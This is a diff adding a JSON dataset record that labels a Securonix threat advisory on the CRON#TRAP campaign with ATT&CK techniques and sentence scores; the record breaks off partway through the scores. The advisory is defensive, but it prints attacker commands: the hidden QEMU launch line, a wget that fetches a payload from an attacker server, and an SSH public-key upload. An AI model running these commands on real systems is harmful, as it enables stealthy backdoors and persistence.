@@ -1,0 +1,418 @@
+{
+  "original_txt": "Securonix Threat Research Security Advisory\nCRON#TRAP: Emulated Linux Environments as the Latest Tactic in Malware Staging\nBy Securonix Threat Research: Den Iuzvyk, Tim Peck\nNov 4, 2024\ntldr:\nIn a rather novel attack chain, attackers deploy a custom-made emulated QEMU Linux box to persist on endpoints, delivered through phishing emails.\nThe Securonix Threat Research team has been tracking an intriguing attack campaign that leverages a malicious shortcut (.lnk) file. When executed, this file extracts and initiates a lightweight, custom Linux environment emulated through QEMU.\nWhat makes the CRON#TRAP campaign particularly concerning is that the emulated Linux instance comes pre-configured with a backdoor that automatically connects to an attacker-controlled Command and Control (C2) server. This setup allows the attacker to maintain a stealthy presence on the victim’s machine, staging further malicious activity within a concealed environment, making detection challenging for traditional antivirus solutions. Since QEMU is legitimate software, often used in development and research, its presence typically won’t trigger any security alarms.\nWe were unfortunately not able to establish confident attribution or victimology with this campaign. However, based on sample telemetry, most sources appeared to originate from the US and Europe. Additionally, based on the verbiage used throughout the campaign and considering the command and control servers were located within the United States, allowing us to suggest with low to medium confidence that North America may have been a primary target.\nBefore we get ahead of ourselves, let’s back it up a little bit. So what is QEMU and how can it be used maliciously?\nIn a nutshell, QEMU (Quick Emulator) is a legitimate, open-source virtualization tool that allows for emulating various hardware and processor architectures, enabling them to run different operating systems or applications in a virtualized environment. It can simulate processors like x86, ARM, and PowerPC, making it versatile for testing, development, and research. In the case of the CRON#TRAP campaign, the attackers opted to emulate a Linux installation of Tiny Core Linux. As far as we can determine, this is the first time that this tool has been used by attackers for malicious purposes outside of Cryptomining.\nInitial infection\nWhile our team was not able to derive the original source of the attack, we believe that the attack began with a phishing email which contained a link to download a zip file. The theme appears to be survey-related.\nTaking a quick look at the zip file, it is absolutely massive for a phishing document. The file stands at an impressive 285MB which could raise suspicions to some users. When the user extracts the archive, they’re presented with a single file (shortcut) and a “data” directory containing the entire QEMU installation directory.\nThe entirety of the data folder’s contents have the hidden attribute applied, so unless the user has the “view hidden files” Explorer option enabled, they won’t see any contained contents.\nTaking a look at the shortcut file, it appears to link to the system’s PowerShell process and executes a simple command. The command takes the downloaded zip file and (re)extracts its contents into the user’s profile directory into a directory called “datax”. It then executes start.bat contained at:\n“$home\\datax\\data\\start.bat”\nThe batch file start.bat accomplishes two tasks. First, it uses explorer.exe to display a “server error” to the user implying that the link or URL to the survey was somehow broken on the server-side. The user at this point would probably dismiss the error. The entirety of the start.bat code can be seen in the image below. Second, the script executes the QEMU process and command line to start the emulated Linux environment. The process qemu.exe was renamed to fontdiag.exe by the attacker prior to delivery of the phishing lure.\nFigure 1: contents of start.bat\nLure document\nThe image is executed by the explorer.exe process. Since the image is hosted on a remote server via HTTPS, the user’s default browser would open and display the image. The image is a simple server error message. While there is technically no error, rather an image of the error, the attackers would hope this would be glanced over by the user. The image was hosted on a public site:\nhxxps://forum.hestiacp[.]com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png\nFigure 2: Lure image (masquerading as a server error)\nQEMU: Mount and execute\nAs mentioned earlier, the QEMU process was renamed and executed using the start.bat script. This QEMU process is the legitimate process and is digitally signed using a valid digital certificate. The Linux box was executed using the following command:\nSTART /B %HOMEPATH%\\datax\\data\\fontdiag.exe -drive file=%HOMEPATH%\\datax\\data\\tc.img -nographic &\nThe use of the “-nographic” parameter means that the Linux virtual environment will run silently in the background. For the sake of analysis, we removed this to interact with the OS. Fortunately, as we don’t know the user’s password, auto login was enabled! At this stage, we can interact with the OS.\nPivotBox: Exploring the attacker’s Linux environment\nAs seen in the image below, the MOTD banner displays “PivotBox” as well as an options command. These appear to be custom-set by the attacker as we witnessed many edits to /etc/motd and the user’s .ashrc file (see history section below). This file is the user’s profile configuration for the Almquist Shell (often referred to as ash), a lightweight shell commonly used in Unix-like operating systems.\nThe options command yielded two “special commands” get-host-shell\nand get-host-user\nwhich allow for interacting with the host.\nFigure 3: Screenshot of “PivotBox” – custom Tiny Core Linux QEMU instance\nThe get-host-shell\nalias created by the attacker attempts to spawn an interactive shell on the host machine by initiating an SSH connection. The command uses information stored in a QEMU-specific file, /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw\n, which contains user context information.\nThe command points to IP 10.0.2.2, a common IP for host-guest communication in virtualized environments, which serves as an alias to the host’s loopback interface.\nThe get-host-user\nAlias fetches and displays the username or context that the QEMU instance is running under on the host by reading from usercontext/raw.\nExploring PivotBox’s command history\nLinux by default will store a record of all commands executed by the user inside the user’s profile directory. As the ash shell was used, we were fortunate to find that we had obtained a command record of the creation of the PivotBox Linux image. Typically good OPSEC (operational security) would entail clearing the history, especially if the image would be deployed elsewhere. We’re not sure if this was a lapse in the attacker’s workflow, or if they just didn’t care.\nFigure 4: Screenshot of a portion of the attacker’s .ash_history file\nWhile there’s a lot to unpack, let’s take a look at some of the highlights that we discovered. The .ash_history file provided us with a series of steps that suggest an advanced attempt at persistence by creating this stealthy toolkit within its own environment Here’s a breakdown of the key actions:\nNetwork Testing & Initial Reconnaissance\nCommands: ping google.com\nand wget\nPurpose: Confirm network connectivity and attempt to fetch remote resources (likely staging or payload files) from both IP-based URLs (192.168.160.143) and GitHub-hosted content. The private 192 address would appear to be from the attacker’s testing infrastructure.\nTool Installation and Preparation\nCommands: tce-load -wi [tool]\nPurpose: This Tiny Core Linux (tce\n) command installs tools such as vim, file, and openssh, indicating the attacker is preparing the environment for modifications, file analysis, and SSH access.\nImplication: The installation of openssh hints at establishing persistent remote access.\nPayload Manipulation and Execution\nCommands: ./crondx, chmod +x crondx, ln -s /lib /lib64\nPurpose: Execution of crondx, potentially after renaming or replacing files downloaded from the attacker’s server or GitHub repositories. Linking /lib to /lib64 suggests an attempt to bypass environment dependencies.\nObservations:\nwget http://192.168.160.143:8000/crondx\ndownloads a file to be used as crondx, later executed multiple times with variations (./crondx, /bin/bash ./crondx\n).\nRegular use of file analysis (file crondx) indicates testing or validation of each download.\nConfiguration Persistence and Privilege Escalation\nCommands: sudo vim /opt/bootlocal.sh, filetool.sh -b\nPurpose: Editing /opt/bootlocal.sh is used to persist changes across reboots. Using filetool.sh -b\nis a method to save changes in Tiny Core Linux’s file structure, ensuring that any modifications to system configuration are retained.\nPersistence: By modifying and backing up configurations, it ensures that crondx will be reloaded or re-executed on each start of the QEMU instance.\nSSH Key Manipulation for Remote Access\nCommands: ssh-keygen -t rsa, curl --upload-file ~/.ssh/id_rsa.pub\nPurpose: By generating an SSH key and uploading the public key, the attacker aims to access the target machine without a password.\nImplication: This is a classic persistence technique, allowing re-entry into the environment by using SSH keys uploaded to a known location.\nFile and Environment Management\nCommands: tce-load -i 7z, unzip, 7z x [archive.zip]\nPurpose: Frequent use of archive tools shows a method for handling large file transfers or additional payloads while maintaining an organized working environment.\nThe repeated downloads and extractions of files (such as resolvd.zip, ch.zip) likely contain supplementary payloads or configurations.\nSystem and User Enumeration\nCommands: get-host-user, uname -a, df, ls -hal\nPurpose: Basic reconnaissance to understand the environment, identify user information, and confirm file locations.\nImplication: This allows the attacker to adjust actions based on system architecture or available space, tailoring commands to the target.\nPotential Exfiltration or Command Control Channels\nCommands: wget hxxps://free[.]keep.sh\nPurpose: Using a free file-sharing service could serve as an exfiltration channel for SSH keys or other sensitive files.\nSummary of the command history:\nLike a game of chess, the attackers prepped their environment with a strategy in mind. They systematically installed, tested, and executed multiple payloads and configurations, each preparing for the next phase. The use of bootlocal.sh and SSH keys indicates they’re aiming for a reliable presence on the machine. There were several times where they downloaded crondx files from various URLs. The reasons for this were unknown, however we speculate that they could have been modifying the payload until it functions as expected.\nAnalysis of crondx (Chisel)\nThe binary file that gets executed at the startup of the Linux QEMU instance is located at /home/tc/crondx. The file is a 64-bit ELF executable compiled in Go (golang). Some of the high level details can be found below.\nFigure 5: File overview of crondx\nUpon closer inspection, the binary appears to be a pre-configured Chisel client designed to connect to a remote Command and Control (C2) server at 18.208.230[.]174 via websockets. Typically, a Chisel client requires command-line parameters to specify modes (client or server) and connection details. In this case, however, the attackers opted to hard-code these parameters directly into the binary, removing the need for external configuration. This customization is straightforward due to Chisel’s open-source nature and allows the binary to execute with minimal visibility, making detection more challenging.\nAccording to Chisel’s GitHub, it is “…a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.” Chisel’s design makes it particularly effective for creating covert communication channels and tunneling through firewalls, often under the radar of network monitoring tools.\nThe attackers’ approach effectively transforms this Chisel client into a full backdoor, enabling remote command and control traffic to flow in and out of the Linux environment. This setup provides them with persistent, encrypted access to the compromised system that would allow them to manage additional payloads or exfiltrate data at will.\nWrapping up…\nThe CRON#TRAP campaign demonstrates a sophisticated and novel approach to compromising systems through a combination of phishing, emulated environments, and stealthy pre-configured tunneling. What makes this campaign so interesting is the fact that it begins with a rather standard sequence of events, a phishing lure, leading to the download of a large zip file containing a malicious .lnk shortcut. However, things take a dramatic turn once code execution begins. PowerShell is used to kick off a chain of events that lead to the starting of an entire emulated Linux environment using a disguised QEMU executable. This emulated Linux environment enables the attacker to operate outside the visibility of traditional antivirus solutions.\nWithin this environment, a highly customized setup unfolds. The emulated system includes a crondx (Chisel) binary, a tunneling tool commonly used for passing data covertly through firewalls. The Chisel client is pre-configured with hard-coded parameters, allowing it to connect automatically to a remote Command and Control (C2) server via websockets, providing attackers with a persistent backdoor into the environment.\nThe attacker’s presence in the emulated Linux system is further reinforced by various persistence techniques. Through modifications in startup scripts and the use of SSH keys, they ensure continued access even after reboots. Command aliases, such as get-host-shell\nand get-host-user\n, allow them to interact directly with the host machine from within the isolated QEMU environment, a feature likely intended to facilitate lateral movement or data exfiltration.\nThe .ash_history\nfile reveals a trail of actions taken to install tools, gather system information, and download additional payloads, showcasing a modular and adaptive attack method. The attacker’s reliance on legitimate software like QEMU and Chisel adds an additional layer of evasion, as these tools are unlikely to trigger alerts in many environments.\nSecuronix recommendations\n- As this campaign likely started using phishing emails, avoid downloading files or attachments from external sources, especially if the source was unsolicited. Common file types include zip, rar, iso, and pdf. Additionally, external links to download these kinds of files should be considered equally dangerous. Zip files, sometimes password-protected, were used during this campaign.\n- Monitor common malware staging directories, especially script-related activity in world-writable directories. In the case of this campaign the threat actors staged their QEMU instance from the user’s home directory at:\n%HOME%\\datax\n.\n- Monitor for the use of legitimate software being executed from unusual locations.\n- We strongly recommend deploying robust endpoint logging capabilities to aid in PowerShell detections. This includes leveraging additional process-level logging such as Sysmon and PowerShell logging for additional log detection coverage.\n- Securonix customers can scan endpoints using the Securonix hunting queries below.\nMITRE ATT&CK Matrix\n|\nTactics\n|\nTechniques\n|\n|\nInitial Access\n|\nT1566.001: Phishing: Spearphishing Attachment\n|\n|\nCommand and Control\n|\nT1071.001: Application Layer Protocol: Web Protocols\nT1132: Data Encoding\nT1572: Protocol Tunneling\n|\n|\nDefense Evasion\n|\nT1027: Obfuscated Files or Information\nT1036: Masquerading\nT1218: System Binary Proxy Execution\nT1564.006: Hide Artifacts: Run Virtual Instance\n|\n|\nExecution\n|\nT1059.001: Command and Scripting Interpreter: PowerShell\nT1059.003: Command and Scripting Interpreter: Windows Command Shell\nT1204.001: User Execution: Malicious Link\nT1204.002: User Execution: Malicious File\n|\n|\nPersistence\n|\nT1072: Software Deployment Tools\n|\n|\nExfiltration\n|\nT1041: Exfiltration Over C2 Channel\n|\nRelevant hunting queries\n(remove square brackets “[ ]” for IP addresses or URLs)\n- index = activity AND rg_functionality = “Next Generation Firewall” AND destinationaddress = “18.208.230[.]174”\n- index = activity AND rg_functionality = “Next Generation Firewall” AND destinationhostname CONTAINS “forum.hestiacp[.]com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png”\n- index = activity AND rg_functionality = “Endpoint Management Systems” AND (deviceaction = “File created” OR deviceaction = “File created (rule: FileCreate)”) AND customstring49 ENDS WITH “\\\\datax\\\\data\\\\fontdiag.exe”)\n- index = activity AND rg_functionality = “Endpoint Management Systems” AND (deviceaction = “Process Create” OR deviceaction = “Process Create (rule: ProcessCreate)” OR deviceaction = “ProcessRollup2” OR deviceaction = “Procstart” OR deviceaction = “Process” OR deviceaction = “Trace Executed Process”) AND customstring48 = “QEMU machine emulators and tools” AND customstring54 NOT CONTAINS “\\\\Program Files”\nC2 and infrastructure\n|\nC2 Address\n|\n|\n18.208.230[.]174\n|\n|\ngithub[.]com/yaniraenrica/testing/raw/main/resolvd.zip\n|\n|\ngithub[.]com/rustyshackleford72/testing/raw/main/cheezel-client\n|\n|\ngithub[.]com/gregtunny/data/raw/refs/heads/main/ch.zip\n|\n|\nforum.hestiacp[.]com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png\n|\nReferences:\n- LoudMiner: Cross-platform mining in cracked VST software\nhttps://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/\nAnalyzed files/hashes\n|\nSHA256\n|\n|\nCE26AAC9BA7BE60BFB998BA6ADD6B34DA5A68506E9FEA9844DC44BAFE3CAB676\n|\n|\n0618BB997462F350BC4402C1A5656B38BEDC278455823AC249FD5119868D3DF4\n|\n|\n9FFAD9CF6D93B21BB0CA15DE9AB9E782E78F2B6356D05FB55FB95F55BEC9FC04\n002f9cd9ffa4b81301d003acd9fb3fbba1262e593b4f2e56a085b62a50e76510\n|\n|\n5A8BC06587CE40B3A8D8DD4037D0EF272EFC64A69E21F6689FFE3F5FBB04A468\n4C91070877C6D116F5A27EFADDBBFBC339455628E9D6585A4EA5F9B6972BF92B\n|\n|\nBC7A34379602F9F061BDB94EC65E8E46DA0257D511022A17D2555ADBD4B1DD38\n|\n|\n3E6A47DA0A226A4C98FB53A06EC1894B4BFD15E73D0CEA856B7D2A001CADA7E9\n|\n|\n9A33EA831EDF83CB8775311963F52299F1488A89651BD3471CC8F1C70F08A36C\n82A9747485FDD60360D28CD73671F171A8312B7D68B26FE1E2D472EB97C4FE59\nF4229128EF642D299F7AB5FBCB6DE75A17D12F30F22A3985044C8B1B44F1768F\n6903BDF7F4A22ECFDDBAEE0B16E3DEE85DBB169AA446094BB3D1B75526677B6C\n|",
+  "sanitized_txt": "Securonix Threat Research Security Advisory CRON#TRAP: Emulated Linux Environments as the Latest Tactic in Malware Staging By Securonix Threat Research: Den Iuzvyk, Tim Peck Nov 4, 2024 tldr:\nIn a rather novel attack chain, attackers deploy a custom-made emulated QEMU Linux box to persist on endpoints, delivered through phishing emails.\nThe Securonix Threat Research team has been tracking an intriguing attack campaign that leverages a malicious shortcut (.lnk) file. When executed, this file extracts and initiates a lightweight, custom Linux environment emulated through QEMU.\nWhat makes the CRON#TRAP campaign particularly concerning is that the emulated Linux instance comes pre-configured with a backdoor that automatically connects to an attacker-controlled Command and Control (C2) server. This setup allows the attacker to maintain a stealthy presence on the victim’s machine, staging further malicious activity within a concealed environment, making detection challenging for traditional antivirus solutions. Since QEMU is legitimate software, often used in development and research, its presence typically won’t trigger any security alarms.\nWe were unfortunately not able to establish confident attribution or victimology with this campaign. However, based on sample telemetry, most sources appeared to originate from the US and Europe. Additionally, based on the verbiage used throughout the campaign and considering the command and control servers were located within the United States, allowing us to suggest with low to medium confidence that North America may have been a primary target.\nBefore we get ahead of ourselves, let’s back it up a little bit. So what is QEMU and how can it be used maliciously?\nIn a nutshell, QEMU (Quick Emulator) is a legitimate, open-source virtualization tool that allows for emulating various hardware and processor architectures, enabling them to run different operating systems or applications in a virtualized environment. It can simulate processors like x86, ARM, and PowerPC, making it versatile for testing, development, and research. In the case of the CRON#TRAP campaign, the attackers opted to emulate a Linux installation of Tiny Core Linux. As far as we can determine, this is the first time that this tool has been used by attackers for malicious purposes outside of Cryptomining.\nInitial infection While our team was not able to derive the original source of the attack, we believe that the attack began with a phishing email which contained a link to download a zip file. The theme appears to be survey-related.\nTaking a quick look at the zip file, it is absolutely massive for a phishing document. The file stands at an impressive 285MB which could raise suspicions to some users. When the user extracts the archive, they’re presented with a single file (shortcut) and a “data” directory containing the entire QEMU installation directory.\nThe entirety of the data folder’s contents have the hidden attribute applied, so unless the user has the “view hidden files” Explorer option enabled, they won’t see any contained contents.\nTaking a look at the shortcut file, it appears to link to the system’s PowerShell process and executes a simple command. The command takes the downloaded zip file and (re)extracts its contents into the user’s profile directory into a directory called “datax”. It then executes start.bat contained at:\n“$home\\datax\\data\\start.bat” The batch file start.bat accomplishes two tasks. First, it uses explorer.exe to display a “server error” to the user implying that the link or URL to the survey was somehow broken on the server-side. The user at this point would probably dismiss the error. The entirety of the start.bat code can be seen in the image below. Second, the script executes the QEMU process and command line to start the emulated Linux environment. The process qemu.exe was renamed to fontdiag.exe by the attacker prior to delivery of the phishing lure.\nFigure 1: contents of start.bat Lure document The image is executed by the explorer.exe process. Since the image is hosted on a remote server via HTTPS, the user’s default browser would open and display the image. The image is a simple server error message. While there is technically no error, rather an image of the error, the attackers would hope this would be glanced over by the user. The image was hosted on a public site:\nhxxps://forum.hestiacp[.]com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png Figure 2: Lure image (masquerading as a server error) QEMU: Mount and execute As mentioned earlier, the QEMU process was renamed and executed using the start.bat script. This QEMU process is the legitimate process and is digitally signed using a valid digital certificate. The Linux box was executed using the following command:\nSTART /B %HOMEPATH%\\datax\\data\\fontdiag.exe -drive file=%HOMEPATH%\\datax\\data\\tc.img -nographic & The use of the “-nographic” parameter means that the Linux virtual environment will run silently in the background. For the sake of analysis, we removed this to interact with the OS. Fortunately, as we don’t know the user’s password, auto login was enabled! At this stage, we can interact with the OS.\nPivotBox: Exploring the attacker’s Linux environment As seen in the image below, the MOTD banner displays “PivotBox” as well as an options command. These appear to be custom-set by the attacker as we witnessed many edits to /etc/motd and the user’s .ashrc file (see history section below). This file is the user’s profile configuration for the Almquist Shell (often referred to as ash), a lightweight shell commonly used in Unix-like operating systems.\nThe options command yielded two “special commands” get-host-shell and get-host-user which allow for interacting with the host.\nFigure 3: Screenshot of “PivotBox” – custom Tiny Core Linux QEMU instance The get-host-shell alias created by the attacker attempts to spawn an interactive shell on the host machine by initiating an SSH connection. The command uses information stored in a QEMU-specific file, /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw , which contains user context information.\nThe command points to IP 10.0.2.2, a common IP for host-guest communication in virtualized environments, which serves as an alias to the host’s loopback interface.\nThe get-host-user Alias fetches and displays the username or context that the QEMU instance is running under on the host by reading from usercontext/raw.\nExploring PivotBox’s command history Linux by default will store a record of all commands executed by the user inside the user’s profile directory. As the ash shell was used, we were fortunate to find that we had obtained a command record of the creation of the PivotBox Linux image. Typically good OPSEC (operational security) would entail clearing the history, especially if the image would be deployed elsewhere. We’re not sure if this was a lapse in the attacker’s workflow, or if they just didn’t care.\nFigure 4: Screenshot of a portion of the attacker’s .ash_history file While there’s a lot to unpack, let’s take a look at some of the highlights that we discovered. The .ash_history file provided us with a series of steps that suggest an advanced attempt at persistence by creating this stealthy toolkit within its own environment Here’s a breakdown of the key actions:\nNetwork Testing & Initial Reconnaissance Commands: ping google.com and wget Purpose: Confirm network connectivity and attempt to fetch remote resources (likely staging or payload files) from both IP-based URLs (192.168.160.143) and GitHub-hosted content. The private 192 address would appear to be from the attacker’s testing infrastructure.\nTool Installation and Preparation Commands: tce-load -wi [tool] Purpose: This Tiny Core Linux (tce ) command installs tools such as vim, file, and openssh, indicating the attacker is preparing the environment for modifications, file analysis, and SSH access.\nImplication: The installation of openssh hints at establishing persistent remote access.\nPayload Manipulation and Execution Commands: ./crondx, chmod +x crondx, ln -s /lib /lib64 Purpose: Execution of crondx, potentially after renaming or replacing files downloaded from the attacker’s server or GitHub repositories. Linking /lib to /lib64 suggests an attempt to bypass environment dependencies.\nObservations:\nwget http://192.168.160.143:8000/crondx downloads a file to be used as crondx, later executed multiple times with variations (./crondx, /bin/bash ./crondx ).\nRegular use of file analysis (file crondx) indicates testing or validation of each download.\nConfiguration Persistence and Privilege Escalation Commands: sudo vim /opt/bootlocal.sh, filetool.sh -b Purpose: Editing /opt/bootlocal.sh is used to persist changes across reboots. Using filetool.sh -b is a method to save changes in Tiny Core Linux’s file structure, ensuring that any modifications to system configuration are retained.\nPersistence: By modifying and backing up configurations, it ensures that crondx will be reloaded or re-executed on each start of the QEMU instance.\nSSH Key Manipulation for Remote Access Commands: ssh-keygen -t rsa, curl --upload-file ~/.ssh/id_rsa.pub Purpose: By generating an SSH key and uploading the public key, the attacker aims to access the target machine without a password.\nImplication: This is a classic persistence technique, allowing re-entry into the environment by using SSH keys uploaded to a known location.\nFile and Environment Management Commands: tce-load -i 7z, unzip, 7z x [archive.zip] Purpose: Frequent use of archive tools shows a method for handling large file transfers or additional payloads while maintaining an organized working environment.\nThe repeated downloads and extractions of files (such as resolvd.zip, ch.zip) likely contain supplementary payloads or configurations.\nSystem and User Enumeration Commands: get-host-user, uname -a, df, ls -hal Purpose: Basic reconnaissance to understand the environment, identify user information, and confirm file locations.\nImplication: This allows the attacker to adjust actions based on system architecture or available space, tailoring commands to the target.\nPotential Exfiltration or Command Control Channels Commands: wget hxxps://free[.]keep.sh Purpose: Using a free file-sharing service could serve as an exfiltration channel for SSH keys or other sensitive files.\nSummary of the command history:\nLike a game of chess, the attackers prepped their environment with a strategy in mind. They systematically installed, tested, and executed multiple payloads and configurations, each preparing for the next phase. The use of bootlocal.sh and SSH keys indicates they’re aiming for a reliable presence on the machine. There were several times where they downloaded crondx files from various URLs. The reasons for this were unknown, however we speculate that they could have been modifying the payload until it functions as expected.\nAnalysis of crondx (Chisel) The binary file that gets executed at the startup of the Linux QEMU instance is located at /home/tc/crondx. The file is a 64-bit ELF executable compiled in Go (golang). Some of the high level details can be found below.\nFigure 5: File overview of crondx Upon closer inspection, the binary appears to be a pre-configured Chisel client designed to connect to a remote Command and Control (C2) server at 18.208.230[.]174 via websockets. Typically, a Chisel client requires command-line parameters to specify modes (client or server) and connection details. In this case, however, the attackers opted to hard-code these parameters directly into the binary, removing the need for external configuration. This customization is straightforward due to Chisel’s open-source nature and allows the binary to execute with minimal visibility, making detection more challenging.\nAccording to Chisel’s GitHub, it is “…a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.” Chisel’s design makes it particularly effective for creating covert communication channels and tunneling through firewalls, often under the radar of network monitoring tools.\nThe attackers’ approach effectively transforms this Chisel client into a full backdoor, enabling remote command and control traffic to flow in and out of the Linux environment. This setup provides them with persistent, encrypted access to the compromised system that would allow them to manage additional payloads or exfiltrate data at will.\nWrapping up… The CRON#TRAP campaign demonstrates a sophisticated and novel approach to compromising systems through a combination of phishing, emulated environments, and stealthy pre-configured tunneling. What makes this campaign so interesting is the fact that it begins with a rather standard sequence of events, a phishing lure, leading to the download of a large zip file containing a malicious .lnk shortcut. However, things take a dramatic turn once code execution begins. PowerShell is used to kick off a chain of events that lead to the starting of an entire emulated Linux environment using a disguised QEMU executable. This emulated Linux environment enables the attacker to operate outside the visibility of traditional antivirus solutions.\nWithin this environment, a highly customized setup unfolds. The emulated system includes a crondx (Chisel) binary, a tunneling tool commonly used for passing data covertly through firewalls. The Chisel client is pre-configured with hard-coded parameters, allowing it to connect automatically to a remote Command and Control (C2) server via websockets, providing attackers with a persistent backdoor into the environment.\nThe attacker’s presence in the emulated Linux system is further reinforced by various persistence techniques. Through modifications in startup scripts and the use of SSH keys, they ensure continued access even after reboots. Command aliases, such as get-host-shell and get-host-user , allow them to interact directly with the host machine from within the isolated QEMU environment, a feature likely intended to facilitate lateral movement or data exfiltration.\nThe .ash_history file reveals a trail of actions taken to install tools, gather system information, and download additional payloads, showcasing a modular and adaptive attack method. The attacker’s reliance on legitimate software like QEMU and Chisel adds an additional layer of evasion, as these tools are unlikely to trigger alerts in many environments.\nSecuronix recommendations - As this campaign likely started using phishing emails, avoid downloading files or attachments from external sources, especially if the source was unsolicited. Common file types include zip, rar, iso, and pdf. Additionally, external links to download these kinds of files should be considered equally dangerous. Zip files, sometimes password-protected, were used during this campaign.\n- Monitor common malware staging directories, especially script-related activity in world-writable directories. In the case of this campaign the threat actors staged their QEMU instance from the user’s home directory at:\n%HOME%\\datax .\n- Monitor for the use of legitimate software being executed from unusual locations.\n- We strongly recommend deploying robust endpoint logging capabilities to aid in PowerShell detections. This includes leveraging additional process-level logging such as Sysmon and PowerShell logging for additional log detection coverage.\n- Securonix customers can scan endpoints using the Securonix hunting queries below.\n- LoudMiner: Cross-platform mining in cracked VST software https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/ Analyzed files/hashes | SHA256 | | CE26AAC9BA7BE60BFB998BA6ADD6B34DA5A68506E9FEA9844DC44BAFE3CAB676 | | 0618BB997462F350BC4402C1A5656B38BEDC278455823AC249FD5119868D3DF4 | | 9FFAD9CF6D93B21BB0CA15DE9AB9E782E78F2B6356D05FB55FB95F55BEC9FC04 002f9cd9ffa4b81301d003acd9fb3fbba1262e593b4f2e56a085b62a50e76510 | | 5A8BC06587CE40B3A8D8DD4037D0EF272EFC64A69E21F6689FFE3F5FBB04A468 4C91070877C6D116F5A27EFADDBBFBC339455628E9D6585A4EA5F9B6972BF92B | | BC7A34379602F9F061BDB94EC65E8E46DA0257D511022A17D2555ADBD4B1DD38 | | 3E6A47DA0A226A4C98FB53A06EC1894B4BFD15E73D0CEA856B7D2A001CADA7E9 | | 9A33EA831EDF83CB8775311963F52299F1488A89651BD3471CC8F1C70F08A36C 82A9747485FDD60360D28CD73671F171A8312B7D68B26FE1E2D472EB97C4FE59 F4229128EF642D299F7AB5FBCB6DE75A17D12F30F22A3985044C8B1B44F1768F 6903BDF7F4A22ECFDDBAEE0B16E3DEE85DBB169AA446094BB3D1B75526677B6C |",
+  "ID_list": [
+    "T1564.006"
+  ],
+  "Name_list": [
+    "Command and Control",
+    "Execution",
+    "Exfiltration",
+    "Lateral Movement",
+    "Masquerading",
+    "Persistence",
+    "Phishing",
+    "PowerShell",
+    "Privilege Escalation",
+    "Reconnaissance",
+    "Source",
+    "Sudo",
+    "Trap"
+  ],
+  "TTP_sentences": {
+    "T1564.006": [
+      {
+        "sentence": "Securonix Threat Research Security Advisory CRON#TRAP: Emulated Linux Environments as the Latest Tactic in Malware Staging By Securonix Threat Research: Den Iuzvyk, Tim Peck Nov 4, 2024 tldr: In a rather novel attack chain, attackers deploy a custom-made emulated QEMU Linux box to persist on endpoints, delivered through phishing emails.",
+        "score": 0.5496
+      },
+      {
+        "sentence": "The Securonix Threat Research team has been tracking an intriguing attack campaign that leverages a malicious shortcut (.lnk) file.",
+        "score": 0.3289
+      },
+      {
+        "sentence": "When executed, this file extracts and initiates a lightweight, custom Linux environment emulated through QEMU.",
+        "score": 0.642
+      },
+      {
+        "sentence": "What makes the CRON#TRAP campaign particularly concerning is that the emulated Linux instance comes pre-configured with a backdoor that automatically connects to an attacker-controlled Command and Control (C2) server.",
+        "score": 0.4414
+      },
+      {
+        "sentence": "This setup allows the attacker to maintain a stealthy presence on the victim’s machine, staging further malicious activity within a concealed environment, making detection challenging for traditional antivirus solutions.",
+        "score": 0.6616
+      },
+      {
+        "sentence": "Since QEMU is legitimate software, often used in development and research, its presence typically won’t trigger any security alarms.",
+        "score": 0.6169
+      },
+      {
+        "sentence": "We were unfortunately not able to establish confident attribution or victimology with this campaign.",
+        "score": 0.3922
+      },
+      {
+        "sentence": "However, based on sample telemetry, most sources appeared to originate from the US and Europe.",
+        "score": 0.3508
+      },
+      {
+        "sentence": "Additionally, based on the verbiage used throughout the campaign and considering the command and control servers were located within the United States, allowing us to suggest with low to medium confidence that North America may have been a primary target.",
+        "score": 0.3677
+      },
+      {
+        "sentence": "Before we get ahead of ourselves, let’s back it up a little bit.",
+        "score": 0.3565
+      },
+      {
+        "sentence": "So what is QEMU and how can it be used maliciously?",
+        "score": 0.4816
+      },
+      {
+        "sentence": "In a nutshell, QEMU (Quick Emulator) is a legitimate, open-source virtualization tool that allows for emulating various hardware and processor architectures, enabling them to run different operating systems or applications in a virtualized environment.",
+        "score": 0.7281
+      },
+      {
+        "sentence": "It can simulate processors like x86, ARM, and PowerPC, making it versatile for testing, development, and research.",
+        "score": 0.5721
+      },
+      {
+        "sentence": "In the case of the CRON#TRAP campaign, the attackers opted to emulate a Linux installation of Tiny Core Linux.",
+        "score": 0.6386
+      },
+      {
+        "sentence": "As far as we can determine, this is the first time that this tool has been used by attackers for malicious purposes outside of Cryptomining.",
+        "score": 0.4778
+      },
+      {
+        "sentence": "The theme appears to be survey-related.",
+        "score": 0.3005
+      },
+      {
+        "sentence": "Taking a quick look at the zip file, it is absolutely massive for a phishing document.",
+        "score": 0.3909
+      },
+      {
+        "sentence": "The file stands at an impressive 285MB which could raise suspicions to some users.",
+        "score": 0.4193
+      },
+      {
+        "sentence": "When the user extracts the archive, they’re presented with a single file (shortcut) and a “data” directory containing the entire QEMU installation directory.",
+        "score": 0.5423
+      },
+      {
+        "sentence": "The entirety of the data folder’s contents have the hidden attribute applied, so unless the user has the “view hidden files” Explorer option enabled, they won’t see any contained contents.",
+        "score": 0.5066
+      },
+      {
+        "sentence": "Taking a look at the shortcut file, it appears to link to the system’s PowerShell process and executes a simple command.",
+        "score": 0.3564
+      },
+      {
+        "sentence": "The command takes the downloaded zip file and (re)extracts its contents into the user’s profile directory into a directory called “datax”.",
+        "score": 0.4493
+      },
+      {
+        "sentence": "It then executes start.bat contained at: “$home\\datax\\data\\start.bat” The batch file start.bat accomplishes two tasks.",
+        "score": 0.4216
+      },
+      {
+        "sentence": "First, it uses explorer.exe to display a “server error” to the user implying that the link or URL to the survey was somehow broken on the server-side.",
+        "score": 0.3616
+      },
+      {
